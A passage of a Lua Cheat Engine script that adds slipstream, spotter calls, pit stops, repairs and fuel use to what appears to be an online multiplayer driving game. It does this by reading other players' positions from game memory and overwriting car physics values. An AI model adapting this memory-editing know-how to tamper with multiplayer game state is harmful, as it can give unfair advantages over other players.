          PlaySound(findTableFile("BeepEnd.wav"), true)
        elseif RainBegun == true then
          PlaySound(findTableFile("BeepStart.wav"), true)
          PlaySound(findTableFile("ItsRaining.wav"), true)
          PlaySound(findTableFile("BeepEnd.wav"), true)
        elseif RainStopped == true then
          PlaySound(findTableFile("BeepStart.wav"), true)
          PlaySound(findTableFile("RainStopped.wav"), true)
          PlaySound(findTableFile("BeepEnd.wav"), true)
        end
      end
    end
  --WEATHER BOT

  --SLIPSTREAM
    function RunCustomSlipStream()

      function CalculateSlipForce(Distance)
        local ApplyForce = (1 - (Distance/50))*0.3
        return ApplyForce
      end

      function CalculateSlipTractionLoss(Distance)
        local TractionLoss = (1 - (Distance/50))*0.1
        return TractionLoss
      end

      function DoSlipstream(HeadX,HeadY,PlayerX,PlayerY,OpponentX,OpponentY)
        local R = (PlayerX*HeadX + PlayerY*HeadY) * (-1)
        local Side = OpponentX*HeadX + OpponentY*HeadY + R
        local FrontSide = (-HeadY)*(OpponentX - PlayerX) + HeadX*(OpponentY - PlayerY)
        local Lenght = (((OpponentX-PlayerX)^(2)+(OpponentY-PlayerY)^(2))^(0.5))
        if (Side < 2 and Side > -2) and (FrontSide > 3 and FrontSide < 50) then
          if Lenght < 50 then
            local CurrentForce = RWDSetted
            local CurrentTractionlLoss = FrontGripSetted
            local AdditionalForce = CalculateSlipForce(Lenght)
            local TractionLoss = CalculateSlipTractionLoss(Lenght)
            CurrentForce = CurrentForce + AdditionalForce
            CurrentTractionlLoss = CurrentTractionlLoss - TractionLoss
            writeFloat(RWDADR,CurrentForce)
            writeFloat(FrontGripADR,CurrentTractionlLoss)
          end
        else
          writeFloat(RWDADR,RWDSetted)
          writeFloat(FrontGripADR,FrontGripSetted)
        end
      end

      function CheckOppoPositionSlip()
        local CNetworkPlayerMgr=readPointer("PlayerCountPTR")
        local Px=readFloat("[[PTR+8]+30]+50")
        local Py=readFloat("[[PTR+8]+30]+54")
        local Hx=readFloat("[[PTR+8]+30]+20")
        local Hy=readFloat("[[PTR+8]+30]+24")
        for i=0,10,1 do
          if i ~= MyIDNumber then
            local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i*8))
            if CNetGamePlayer then
              local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
              if CPlayerInfo then
                local CPed = readPointer(CPlayerInfo + pCNetPed)
                if CPed and CPed ~= 0 then
                  local CNav = readPointer(CPed + pCNavigation)
                  if CNav and CNav ~= 0 then
                    OppoX= readFloat(CNav + oPositionX)
                    OppoY= readFloat(CNav + oPositionY)
                    DoSlipstream(Hx,Hy,Px,Py,OppoX,OppoY)
                  end
                end
              end
            end
          end
        end
      end
    end
  --SLIPSTREAM

  --SPOTTER
    function RunCustomSpotter()
      function CalculateLine(HeadX,HeadY,PlayerX,PlayerY,OpponentX,OpponentY)
        local R = (PlayerX*HeadX + PlayerY*HeadY) * (-1)
        local Side = OpponentX*HeadX + OpponentY*HeadY + R
        local Lenght = (((OpponentX-PlayerX)^(2)+(OpponentY-PlayerY)^(2))^(0.5))
        if Side > 2 and Lenght > 2 and Lenght < 6 then
          --print("Bigger")
          OnYourRight=true
        elseif Side < -2 and Lenght > 2 and Lenght < 6 then
          --print("Less")
          OnYourLeft=true
        end
      end

      function SpotterMessage()
        local Spot = -1
        if OnYourRight==true and OnYourLeft==true then
          Spot=3
        elseif OnYourRight==true and OnYourLeft==false then
          Spot=1
        elseif OnYourRight==false and OnYourLeft==true then
          Spot=2
        else
          Spot=0
        end
        if LastMessage and LastMessage==3 and Spot==0 then PlaySound(findTableFile('Clear.wav'))
        elseif LastMessage and LastMessage==2 and Spot==0 then PlaySound(findTableFile('ClearLeft.wav'))
        elseif LastMessage and LastMessage==1 and Spot==0 then PlaySound(findTableFile('ClearRight.wav'))
        elseif LastMessage~=3 and Spot==3 then PlaySound(findTableFile('ThreeWide.wav'))
        elseif LastMessage~=1 and Spot==1 then PlaySound(findTableFile('CarRight.wav'))
        elseif LastMessage~=2 and Spot==2 then PlaySound(findTableFile('CarLeft.wav'))
        end
        LastMessage=Spot
      end

      function CheckOppoPosition()
        local CNetworkPlayerMgr=readPointer("PlayerCountPTR")
        OnYourRight=false
        OnYourLeft=false
        local Px=readFloat("[[PTR+8]+30]+50")
        local Py=readFloat("[[PTR+8]+30]+54")
        local Hx=readFloat("[[PTR+8]+30]+20")
        local Hy=readFloat("[[PTR+8]+30]+24")
        for i=0,10,1 do
          if i ~= MyIDNumber then
            local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i*8))
            if CNetGamePlayer then
              local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
              if CPlayerInfo then
                local CPed = readPointer(CPlayerInfo + pCNetPed)
                if CPed and CPed ~= 0 then
                  local CNav = readPointer(CPed + pCNavigation)
                  if CNav and CNav ~= 0 then
                    OppoX= readFloat(CNav + oPositionX)
                    OppoY= readFloat(CNav + oPositionY)
                    if OnYourRight==false and OnYourLeft==false then
                      CalculateLine(Hx,Hy,Px,Py,OppoX,OppoY)
                    end
                  end
                end
              end
            end
          end
        end
        SpotterMessage(OnYourRight,OnYourLeft)
      end
    end
  --SPOTTER

  --CHECK POSITION ON TRACK
    function CheckPos()
      if HaveBox == true then
        Curx=readFloat("[[PTR+8]+30]+50")
        Cury=readFloat("[[PTR+8]+30]+54")
        Curz=readFloat("[[PTR+8]+30]+58")
        Pit_Stop_Distance = ((((x-Curx)^2)+((y-Cury)^2)+((z-Curz)^2))^0.5)//1
        if ((Curx > x-10) and (Curx < x+10)) and ((Cury > y-10) and (Cury < y+10)) and ((Curz > z-5) and (Curz < z+5)) and (InThePit==false) then
          UDF1.EnterBoxButton.Enabled = true
          UDF1.EnterBoxButton.Caption = "ENTER BOX"
          UDF1.BackToPitsButton.Enabled = false
          UDF1.RepairEngButton.Enabled = true
          UDF1.FireEngButton.Enabled = true
          if FuelSystemEnabled==true then
           UDF1.Refuel.Enabled = true
          end
          NearPit=true
        else
          UDF1.EnterBoxButton.Caption = Pit_Stop_Distance.." m"
          UDF1.EnterBoxButton.Enabled = false
          UDF1.BackToPitsButton.Enabled = false
          UDF1.RepairEngButton.Enabled = false
          UDF1.FireEngButton.Enabled = false
            UDF1.Refuel.Enabled = false --if fuel
          NearPit=false
        end
      else UDF1.EnterBoxButton.Caption = "NO PIT"
      end
    end
  --CHECK POSITION ON TRACK

  --CUSTOM ENGINE REPAIR
    function RequestRepairEngine()
     if (NearPit==true) and (readFloat(EngineHealthADR) < 1000) and (RepairOn == false) and (OnRefuel==false) then
        if t then
          t.destroy()
        end
        t = createTimer(nil,false)
        timer_onTimer(t,StartEngineRepair)
        timer_setInterval(t, 1000)
        timer_setEnabled(t, true)
        FWDBeforeRepair = readFloat(FWDADR)
        RDWBeforeRepair = readFloat(RWDADR)
        writeFloat(FWDADR,0.001)
        writeFloat(RWDADR,0.001)
        RepairOn=true
        timer_setEnabled(f, false)
        --UDF1.FireEngButton.Caption = "FIRE SUPPRESSION OFF"
        FireSuppOn=false
     elseif (NearPit==true) and (RepairOn == true) then
        if t then t.destroy() end
        --UDF1.RepairEngButton.Caption = "REQUEST ENGINE REPAIR"
        RepairOn=false
        writeFloat(FWDADR,FWDBeforeRepair)
        writeFloat(RWDADR,RDWBeforeRepair)
     end
    end

    function StartEngineRepair()
     local HP = readFloat(EngineHealthADR)
     if HP and HP < 1000 then
       if HP < 0 then
         HP = HP + math.random(90,130)
       end
       HP = HP + math.random(10,20)
       writeFloat(EngineHealthADR, HP)
     else
         RequestRepairEngine()
     end
    end
  --CUSTOM ENGINE REPAIR

  --FIRE SUPPRESSION SYSTEM
    function EnableFireSuppressionSystem(Enable)
     if Enable == true then
        f = createTimer(nil,false)
        timer_onTimer(f,SaveEngine)
        timer_setInterval(f, 2000)
        timer_setEnabled(f, true)
     else
        if f then f.destroy() end
     end
    end

    function SaveEngine()
     local FHP = readFloat(EngineHealthADR)
     --local BodyHP = readFloat(BodyHealthADR)
     if FHP and FHP < (-300) then
       FHP = (-300)
       writeFloat(EngineHealthADR, FHP)
     elseif FHP and FHP == 0 then
       FHP = 100
       writeFloat(EngineHealthADR, FHP)
       FHP = (-200)
       writeFloat(EngineHealthADR, FHP)
     end
     --[[if BodyHP and BodyHP < 0 then
        writeFloat(BodyHealthADR, 10)
     end]]
    end
  --FIRE SUPPRESSION SYSTEM

  --UPDATE CAR STATUS
    function FormStatus()
        if Status then
          Status.destroy()
        end
        Status = createTimer(nil,false)
        timer_onTimer(Status,ShowStatus)
        timer_setInterval(Status, 1000)
        timer_setEnabled(Status, true)
    end

    function ShowStatus()
       local Engine = (readFloat("[[PTR+8]+D30]+908"))
       if Engine~=nil then
         Engine=(Engine//1)/10
         local Body = (readFloat("[[PTR+8]+D30]+844"))
         if Body~=nil then
           Body=(Body//1)/10
           UDF1.EngineHP.Caption=(Engine.."%")
           UDF1.CarStatusCheck.Visible=false
           if Engine > 70 then
              UDF1.EngineHP.Font.Color=65280
           elseif Engine < 70 and Engine > 30 then
              UDF1.EngineHP.Font.Color=54484
           elseif Engine < 30 and Engine > 0 then
                  if CarStatus==true and NotAnnoySevere==false then
                     local random = math.random(1,4)
                     if random==1 then
                        PlaySound(findTableFile("BeepStart.wav"), true)
                        playSound(findTableFile("SevereEngine1.wav"), true)
                        PlaySound(findTableFile("BeepEnd.wav"))
                     elseif random==3 then
                         PlaySound(findTableFile("BeepStart.wav"), true)
                         playSound(findTableFile("SevereEngine2.wav"), true)
                         PlaySound(findTableFile("BeepEnd.wav"))
                     end
                     NotAnnoySevere = true
                  end
              UDF1.EngineHP.Font.Color=219
              UDF1.CarStatusCheck.Visible=true
           elseif (Engine < 0 or Engine == 0) and NotAnnoyKilledEngine == false then
                  local randomkillswear = math.random(1,4)
                  local soundname="EngineGone"..randomkillswear..".wav"
                  PlaySound(findTableFile("BeepStart.wav"), true)
                  playSound(findTableFile(soundname), true)
                  PlaySound(findTableFile("BeepEnd.wav"))
                  NotAnnoyKilledEngine = true
                  local randomkillswear = math.random(0,200)
                  if randomkillswear == 0 then
                     PlaySound(findTableFile("BeepStart.wav"), true)
                     playSound(findTableFile("rants2.wav"), true)
                     PlaySound(findTableFile("BeepEnd.wav"))
                  elseif randomkillswear == 100 then
                         PlaySound(findTableFile("BeepStart.wav"), true)
                         playSound(findTableFile("rants3.wav"), true)
                         PlaySound(findTableFile("BeepEnd.wav"))
                  elseif randomkillswear == 200 then
                         PlaySound(findTableFile("BeepStart.wav"), true)
                         playSound(findTableFile("rants6.wav"), true)
                         PlaySound(findTableFile("BeepEnd.wav"))
                  end
           end
           UDF1.BodyHP.Caption=(Body.."%")
           if Body > 70 then
              UDF1.BodyHP.Font.Color=65280
           elseif Body < 70 and Body > 30 then
              UDF1.BodyHP.Font.Color=54484
           elseif Body < 30 then
              UDF1.BodyHP.Font.Color=204
           end
         end
       end
       if readFloat("[[PTR+8]+D30]+A14") and readBytes("[[[PTR+8]+D30]+48]+3E1") and readBytes("[[[PTR+8]+D30]+48]+406") then
         if (readFloat("[[PTR+8]+D30]+A14")~=HeadlightCurrent and readFloat("[[PTR+8]+D30]+A14")~=nil) or (readBytes("[[[PTR+8]+D30]+48]+3E1")~=XenonCurrent and readBytes("[[[PTR+8]+D30]+48]+3E1")~=nil) or (readBytes("[[[PTR+8]+D30]+48]+406")~=XenonColorCurrent and readBytes("[[[PTR+8]+D30]+48]+406")~=nil) then
            ResetHeadlight()
            SendPack("POSSIBLE RESPAWN",0,1)
         end
       end
    end
  --UPDATE CAR STATUS

  --FUEL
    function CreateFuelEatTimer()
        if FuelEatLoop then
           FuelEatLoop.destroy()
        end
        FuelEatLoop = createTimer(nil,false)
        timer_onTimer(FuelEatLoop,FuelConsumption)
        timer_setInterval(FuelEatLoop, 1000)
    end

    function EnableFuel()
      if FuelSystemEnabled==false then
        FindAdr()
        NormalRepairRate=readFloat('adr+F06230') --F06230  FD158
        SendPack("ENABLED FUEL SYSTEM",0,1)
        FuelSystemEnabled=true
        CreateFuelHotkey()
        UDF1.FuelB.Caption="DISABLE FUEL"
        CreateFuelEatTimer()
        InBox()
      elseif FuelSystemEnabled==true then
        FuelEatLoop.destroy()
        UDF1.FuelB.Caption="ENABLE FUEL"
        SendPack("DISABLED FUEL SYSTEM",0,1)
        --messageDialog("Back to pits to disable fuel system",mtInformation,mbOk)
        FuelSystemEnabled=false
        HotRefuel.destroy()
        IncMix.destroy()
        DecMix.destroy()
      end
    end

    function FuelConsumption()
      if CurrentFuelLoad > 0 then
        RescanUNK()
        local RPM = readFloat("UNK+E50")
          local Gear = readInteger("UNK+FD4")
            if Gear == 0 then
               RPM=0.01
            end
            --print("Current RPM = "..RPM.."/n".."Current Gear = "..Gear)
            local Eat = MixCurrent * (RPM*25000)
            UDF1.FuelUsage.Caption=(((Eat*1000)//1)/1000).."/s"
            CurrentFuelLoad = CurrentFuelLoad - Eat
            UDF1.FuelBar.Position = CurrentFuelLoad*100/CurrentCarMaxFuel
            local BrakeForceMoment = BrakeForceCurrent - ((BrakeForceCurrent/4)/CurrentCarMaxFuel)*CurrentFuelLoad
            local CurveMaxMoment = CurveMaxCurrent - ((CurveMaxCurrent/7)/CurrentCarMaxFuel)*CurrentFuelLoad
            writeFloat(BrakeForceADR, BrakeForceMoment)
            writeFloat(CurveMaxADR, CurveMaxMoment)
            writeFloat('[PTR+8]+14E0',(CurrentFuelLoad*50/CurrentCarMaxFuel))
            UDF1.FuelLevel.Caption=(((CurrentFuelLoad*100)//1)/100).." / "..CurrentCarMaxFuel
            if CurrentFuelLoad==CurrentCarMaxFuel//2 then playSound(findTableFile('Half2.wav')) end
      else
        writeFloat(RWDADR,0.001)
        timer_setEnabled(FuelEatLoop, false)
      end
    end

    function StartNStopRefuel()
     if OnRefuel==false and NearPit==true then
        if RefuelLoop then
          RefuelLoop.destroy()
        end
        RefuelLoop = createTimer(nil,true)
        timer_onTimer(RefuelLoop,Refuel)
        timer_setInterval(RefuelLoop, 10)
        writeFloat(RWDADR,0.001)
        timer_setEnabled(FuelEatLoop, false)
        UDF1.Refuel.Caption="STOP REFUELING"
        SendPack("REFUELING",0,1)
        OnRefuel=true
        writeFloat('adr+F06230',0)
        sleep(150)
     else
        timer_setEnabled(RefuelLoop, false)
        timer_setEnabled(FuelEatLoop, true)
        writeFloat(RWDADR,RWDCurrent)
        UDF1.Refuel.Caption="REFUEL"
        SendPack("REFUELING FINISHED",0,1)
        OnRefuel=false
        writeFloat('adr+F06230',NormalRepairRate)
        sleep(150)
     end
    end

    function Refuel()
     if CurrentFuelLoad < CurrentCarMaxFuel then
        CurrentFuelLoad = CurrentFuelLoad + 0.01
        UDF1.FuelLevel.Caption=(((CurrentFuelLoad*100)//1)/100).." / "..CurrentCarMaxFuel
        UDF1.FuelBar.Position = CurrentFuelLoad*100/CurrentCarMaxFuel
        writeFloat('[PTR+8]+14E0',(CurrentFuelLoad*50/CurrentCarMaxFuel))
     else
        StartNStopRefuel()
     end
    end

    function CreateFuelHotkey()
      HotRefuel = createHotkey(StartNStopRefuel,VK_MULTIPLY)
      IncMix = createHotkey(MixIncrease,VK_RIGHT)
      DecMix = createHotkey(MixDecrease,VK_LEFT)
      Shut = createHotkey(SwitchEngine,VK_DOWN)
    end
  --FUEL

  --MISC
    function FindAdr()
      unregisterSymbol('adr')
      local results = AOBScan('02 00 00 00 ?? 0? 00 00 FF FF FF FF', '*X*C*W', 2, '0000')
      assert(results, 'FAILED TO FIND TRACK INFO')
      local addr = results[0]
      results.destroy()
      registerSymbol('adr',addr)
    end

    function GoInDev()
      SendPack("DEVMODE OPENED",0,1)
      print(' ')
    end

    function Exit()
     if FuelSystemEnabled==true then
        EnableFuel()
     end
     ReturnDefaultsToPreviousCar()
     SendPack("Closed app",1,1)
     LogSender.destroy()
     closeCE()
     return caFree
    end
  --MISC

  --RUN
  Main()
